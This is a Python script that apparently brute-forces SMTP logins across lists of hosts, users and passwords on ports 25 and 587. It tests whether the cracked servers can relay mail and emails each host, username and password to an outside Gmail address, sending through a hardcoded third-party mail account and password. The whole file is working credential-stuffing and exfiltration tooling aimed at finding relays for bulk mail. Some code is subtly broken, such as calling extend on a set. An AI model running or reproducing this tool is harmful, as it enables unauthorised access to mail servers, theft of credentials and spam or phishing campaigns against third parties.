import socket
import sys
import base64
import threading
import queue
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import time
import logging
from datetime import datetime, timedelta
import json
import os
import traceback
import argparse
import signal

# --- SMTP CONFIGURATION (EDIT THESE or set environment variables) ---
SMTP_SERVER = os.getenv('SMTP_SERVER', "mail.globalhouse.co.th")
SMTP_PORT = int(os.getenv('SMTP_PORT', "587"))  # Added this line for the SMTP notification port
SMTP_USER = os.getenv('SMTP_USER', "tp@globalhouse.co.th")
SMTP_PASS = os.getenv('SMTP_PASS', "Globalhouse@123")
NOTIFY_EMAIL = os.getenv('NOTIFY_EMAIL', "Selfless046@gmail.com")
# ---------------------------------------

# --- NOTIFICATION SETTINGS ---
MIN_NOTIFICATION_INTERVAL = 300  # 5 mins between notifications per host
MAX_NOTIFICATIONS_PER_HOUR = 10 ** 9  # effectively unlimited notifications
ONLY_NOTIFY_DELIVERABLE_SMTP = True
THROTTLE_DELAY_SECONDS = 0.1  # Throttle delay between attempts per thread
# -----------------------------

logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('smtp_scanner.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

notification_tracker = {
    'last_notification_time': {},
    'hourly_count': 0,
    'hour_start': datetime.now()
}

notification_file = 'notification_history.json'


def load_notification_history():
    global notification_tracker
    if os.path.exists(notification_file):
        try:
            with open(notification_file, 'r') as f:
                data = json.load(f)
                data['last_notification_time'] = {
                    host: datetime.fromisoformat(t)
                    for host, t in data.get('last_notification_time', {}).items()
                }
                data['hour_start'] = datetime.fromisoformat(data['hour_start'])
                notification_tracker.update(data)
        except Exception as e:
            logger.warning(f"Could not load notification history: {e}")


def save_notification_history():
    try:
        data = notification_tracker.copy()
        data['last_notification_time'] = {
            host: dt.isoformat() for host, dt in data['last_notification_time'].items()
        }
        data['hour_start'] = data['hour_start'].isoformat()
        with open(notification_file, 'w') as f:
            json.dump(data, f, indent=2)
    except Exception as e:
        logger.error(f"Could not save notification history: {e}")


def signal_handler(sig, frame):
    logger.info('Received exit signal, shutting down gracefully...')
    save_notification_history()
    sys.exit(0)


signal.signal(signal.SIGINT, signal_handler)

parser = argparse.ArgumentParser(description='SMTP Scanner')
parser.add_argument('threads', type=int, help='Number of threads')
parser.add_argument('verbose', choices=['good', 'bad'], help='Verbosity level')
parser.add_argument('debug', choices=['d1', 'd2', 'd3', 'd4'], help='Debug level')
args = parser.parse_args()

ThreadNumber = args.threads
Verbose = args.verbose
Dbg = args.debug

# Thread-safe cracked list and write lock
cracked_lock = threading.Lock()
write_lock = threading.Lock()
cracked = set()


def load_lines(filename):
    lines = []
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    lines.append(line)
    except FileNotFoundError:
        logger.warning(f"File not found: {filename}")
    return lines


def can_send_notification(host):
    now = datetime.now()

    if now - notification_tracker['hour_start'] > timedelta(hours=1):
        notification_tracker['hourly_count'] = 0
        notification_tracker['hour_start'] = now

    if host in notification_tracker['last_notification_time']:
        elapsed = (now - notification_tracker['last_notification_time'][host]).total_seconds()
        if elapsed < MIN_NOTIFICATION_INTERVAL:
            logger.debug(f"Skipping notification for {host}: only {elapsed:.1f}s since last notification")
            return False

    return True


def send_email_notification(subject, body, host, port):
    if not can_send_notification(host):
        logger.debug(f"Notification skipped by rate limit for host {host}")
        return False
    try:
        msg = MIMEMultipart()
        msg['Subject'] = f"[DELIVERABLE SMTP] {subject}"
        msg['From'] = SMTP_USER
        msg['To'] = NOTIFY_EMAIL

        enhanced_body = f"""DELIVERABLE SMTP Server Alert
===================================

{body}

Port: {port}

Scanner Details:
- Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
- Scanner Host: {socket.gethostname()}
- Thread Count: {ThreadNumber}
- Status: DELIVERABLE (Live + Authenticated)

This server is ready for email delivery operations.
This is an automated notification from your SMTP scanner.
"""
        msg.attach(MIMEText(enhanced_body, 'plain'))

        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT, timeout=20)
        server.starttls()
        server.login(SMTP_USER, SMTP_PASS)
        server.sendmail(SMTP_USER, [NOTIFY_EMAIL], msg.as_string())
        server.quit()

        notification_tracker['last_notification_time'][host] = datetime.now()
        notification_tracker['hourly_count'] += 1
        save_notification_history()

        logger.info(f"Notification sent for {host}: {subject}")
        return True
    except Exception as e:
        logger.error(f"Failed to send notification for {host}: {e}\n{traceback.format_exc()}")
        return False


def GetDomainFromBanner(banner):
    try:
        if banner.startswith("220 "):
            TempBanner = banner.split(" ")[1]
        elif banner.startswith("220-"):
            TempBanner = banner.split(" ")[0].split("220-")[1]
        else:
            TempBanner = banner
        FirstDomain = TempBanner.rstrip()
        subs = ['.com', '.org', '.net', '.edu', '.gov']
        for sd in subs:
            if FirstDomain.endswith(sd):
                parts = FirstDomain.split(".")
                if len(parts) >= 3:
                    return ".".join(parts[-3:])
                return FirstDomain
        parts = FirstDomain.split(".")
        if len(parts) >= 2:
            return ".".join(parts[-2:])
        return FirstDomain
    except Exception as e:
        logger.error(f"Error parsing banner: {e}")
        return "unknown.domain"


def validate_smtp_server(host, port=25, timeout=15):
    try:
        with socket.create_connection((host, port), timeout=timeout) as sock:
            banner = sock.recv(1024).decode(errors='ignore')
            if not banner.startswith('220'):
                return False, f"Invalid banner: {banner.strip()}"
            sock.sendall(b'EHLO scanner-test\r\n')
            ehlo_resp = sock.recv(2048).decode(errors='ignore')
            sock.sendall(b'QUIT\r\n')
            sock.recv(256)
            if '250' in ehlo_resp:
                return True, f"Banner: {banner.strip()}, EHLO: OK"
            else:
                return False, f"EHLO failed: {ehlo_resp.strip()}"
    except Exception as e:
        return False, f"Exception: {e}"


def test_email_delivery(host, port, user, password):
    try:
        with smtplib.SMTP(host, port, timeout=15) as server:
            server.starttls()
            server.login(user, password)
            server.mail(user)
            try:
                server.rcpt("test@example.com")
                return True
            except smtplib.SMTPRecipientsRefused:
                return True
            except Exception:
                return False
    except Exception as e:
        logger.debug(f"Email delivery test failed at {host}:{port}: {e}")
        return False


class SMTPScanner(threading.Thread):
    def __init__(self, queue, bad_file, val_file, live_file, deliverable_file):
        super().__init__()
        self.queue = queue
        self.bad = bad_file
        self.val = val_file
        self.live = live_file
        self.deliverable = deliverable_file

    def run(self):
        while True:
            host, port, user, passwd = self.queue.get()
            try:
                self.scan_host(host, port, user, passwd)
            except Exception as e:
                logger.error(f"Thread error scanning {host}: {e}\n{traceback.format_exc()}")
            self.queue.task_done()

    def scan_host(self, host, port, user, passwd):
        # Skip already cracked hosts
        with cracked_lock:
            if f"{host}:{port}" in cracked:
                if THROTTLE_DELAY_SECONDS > 0:
                    time.sleep(THROTTLE_DELAY_SECONDS)
                return False

        is_valid, val_info = validate_smtp_server(host, port)
        if not is_valid:
            if Verbose == 'bad':
                with write_lock:
                    self.bad.write(f"{host}:{port} - {val_info}\n")
                    self.bad.flush()
            if THROTTLE_DELAY_SECONDS > 0:
                time.sleep(THROTTLE_DELAY_SECONDS)
            return False

        with write_lock:
            self.live.write(f"{host}:{port} - {val_info}\n")
            self.live.flush()

        if Dbg in ['d1', 'd3', 'd4']:
            print(f"[LIVE] {host}:{port} - {val_info}")

        if user and passwd:
            auth_res, auth_details = self.test_authentication(host, port, user, passwd, val_info)
            if auth_res:
                with cracked_lock:
                    cracked.add(f"{host}:{port}")

                can_deliver = test_email_delivery(host, port, auth_details['user'], auth_details['password'])
                if can_deliver:
                    delivery_status = "DELIVERABLE (Live + Authenticated + Delivery Capable)"
                    entry = f"{host}:{port} {auth_details['user']} {auth_details['password']} - {val_info} - {delivery_status}\n"
                    with write_lock:
                        self.deliverable.write(entry)
                        self.deliverable.flush()
                        self.val.write(f"{host}:{port} {auth_details['user']} {auth_details['password']}\n")
                        self.val.flush()
                    if ONLY_NOTIFY_DELIVERABLE_SMTP:
                        subject = f"DELIVERABLE SMTP Found: {host}:{port}"
                        body = f"""Host: {host}
Port: {port}
User: {auth_details['user']}
Password: {auth_details['password']}
Validation: {val_info}
Status: {delivery_status}

This SMTP server is ready for email delivery operations."""
                        send_email_notification(subject, body, host, port)
                    logger.info(f"DELIVERABLE SMTP found: {host}:{port}")
                else:
                    logger.info(f"Authenticated but not deliverable: {host}:{port}")
                    with write_lock:
                        self.val.write(f"{host}:{port} {auth_details['user']} {auth_details['password']} - NOT DELIVERABLE\n")
                        self.val.flush()
                return True
        return True

    def test_authentication(self, host, port, user, passwd, validation_info, max_retries=3):
        attempt = 0
        while attempt < max_retries:
            try:
                with socket.create_connection((host, port), timeout=15) as sock:
                    try:
                        banner = sock.recv(1024).decode(errors='ignore')
                    except (ConnectionResetError, ConnectionAbortedError) as e:
                        logger.warning(f"Connection reset by remote host while receiving banner from {host}:{port} - {e}")
                        return False, {}

                    if not banner.startswith('220'):
                        return False, {}

                    sock.sendall(b'EHLO scanner\r\n')

                    try:
                        data = sock.recv(2048).decode(errors='ignore')
                    except (ConnectionResetError, ConnectionAbortedError) as e:
                        logger.warning(f"Connection reset by remote host during EHLO response from {host}:{port} - {e}")
                        return False, {}

                    if '250' not in data:
                        sock.sendall(b'QUIT\r\n')
                        sock.close()
                        return False, {}

                    domain = GetDomainFromBanner(banner)
                    userd = f"{user}@{domain}"

                    for pwd in passwd.split("|"):
                        pwd2 = pwd.replace("%user%", user).replace("%User%", user.title())

                        sock.sendall(b'RSET\r\n')
                        try:
                            sock.recv(256)
                        except (ConnectionResetError, ConnectionAbortedError) as e:
                            logger.warning(f"Connection reset by remote host after RSET at {host}:{port} - {e}")
                            return False, {}

                        sock.sendall(b'AUTH LOGIN\r\n')

                        try:
                            auth_prompt = sock.recv(256).decode(errors='ignore')
                        except (ConnectionResetError, ConnectionAbortedError) as e:
                            logger.warning(f"Connection reset by remote host during auth prompt on {host}:{port} - {e}")
                            return False, {}

                        if not auth_prompt.startswith('334'):
                            continue

                        if Dbg in ['d1', 'd3']:
                            print(f"[AUTH] Trying {host}:{port} {userd} {pwd2}")

                        sock.sendall(base64.b64encode(userd.rstrip().encode()) + b'\r\n')
                        try:
                            sock.recv(256)
                        except (ConnectionResetError, ConnectionAbortedError) as e:
                            logger.warning(f"Connection reset by remote host after sending user at {host}:{port} - {e}")
                            return False, {}

                        sock.sendall(base64.b64encode(pwd2.encode()) + b'\r\n')
                        try:
                            response = sock.recv(256).decode(errors='ignore')
                        except (ConnectionResetError, ConnectionAbortedError) as e:
                            logger.warning(f"Connection reset by remote host after sending password at {host}:{port} - {e}")
                            return False, {}

                        if response.startswith('235'):
                            logger.info(f"Valid credentials: {host}:{port} {userd} {pwd2}")
                            sock.sendall(b'QUIT\r\n')
                            return True, {'user': userd, 'password': pwd2, 'banner': banner.strip(), 'validation': validation_info}

                    sock.sendall(b'QUIT\r\n')
                    return False, {}

            except (ConnectionResetError, ConnectionAbortedError, socket.timeout, socket.error) as e:
                logger.warning(f"Connection error on {host}:{port} attempt {attempt+1}/{max_retries} - {e}")
                attempt += 1
                time.sleep(1)  # Back-off before retry
                continue
            except Exception as e:
                logger.error(f"Auth test failed {host}:{port}: {e}\n{traceback.format_exc()}")
                return False, {}

        # Failed after retries
        return False, {}


def main(users, passwords, thread_number):
    logger.info(f"Starting SMTP scanner with {thread_number} threads")
    logger.info("Notification mode: DELIVERABLE SMTPs only (Live + Authenticated + Delivery Capable)")

    q = queue.Queue(maxsize=40000)

    with open('bad.txt', 'w', encoding='utf-8') as bad_file, \
         open('valid.txt', 'a', encoding='utf-8') as val_file, \
         open('live_smtp_servers.txt', 'a', encoding='utf-8') as live_file, \
         open('deliverable_smtp_servers.txt', 'a', encoding='utf-8') as deliverable_file:

        for _ in range(thread_number):
            thread = SMTPScanner(q, bad_file, val_file, live_file, deliverable_file)
            thread.daemon = True
            thread.start()

        hosts = load_lines('ips.txt')
        # Use standard SMTP ports:
        ports = [25, 587]
        total_combinations = len(hosts) * len(users) * len(passwords) * len(ports)
        logger.info(f"Processing {total_combinations} combinations across {len(hosts)} hosts and ports {ports}")

        for passwd in passwords:
            for user in users:
                for host in hosts:
                    if host.strip():
                        for port in ports:
                            q.put((host.strip(), port, user, passwd))

        q.join()
        logger.info("Scanning completed")

        # Send summary notification
        try:
            with open('deliverable_smtp_servers.txt', 'r') as f:
                deliverable_count = sum(1 for _ in f)
            if deliverable_count > 0:
                subject = f"SMTP Scan Complete - {deliverable_count} DELIVERABLE Servers Found"
                body = f"""Scan Summary:
- Total DELIVERABLE SMTP servers: {deliverable_count}
- Thread count used: {thread_number}
- Scan completed at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

DELIVERABLE = Live + Authenticated + Email Delivery Capable

Check deliverable_smtp_servers.txt for full details."""
                send_email_notification(subject, body, "summary", "-")
            else:
                logger.info("No deliverable SMTP servers found")
        except Exception as e:
            logger.error(f"Could not send summary notification: {e}\n{traceback.format_exc()}")


if __name__ == "__main__":
    load_notification_history()

    cracked_list = []
    try:
        alreadycracked = load_lines('valid.txt')
        cracked_list = [line.split(" ")[0].split(":")[0] for line in alreadycracked if ' ' in line]
        cracked.extend(cracked_list)
    except Exception:
        logger.info("No existing valid.txt or error reading")

    users = load_lines('users.txt')
    passwords = load_lines('pass.txt')

    if not users:
        logger.warning("No users loaded; using empty user for live detection")
        users = ['']
    if not passwords:
        logger.warning("No passwords loaded; using empty password for live detection")
        passwords = ['']

    logger.info(f"Loaded {len(users)} users and {len(passwords)} passwords")

    try:
        main(users, passwords, ThreadNumber)
    except Exception as e:
        logger.error(f"Unexpected error in main: {e}\n{traceback.format_exc()}")
    finally:
        save_notification_history()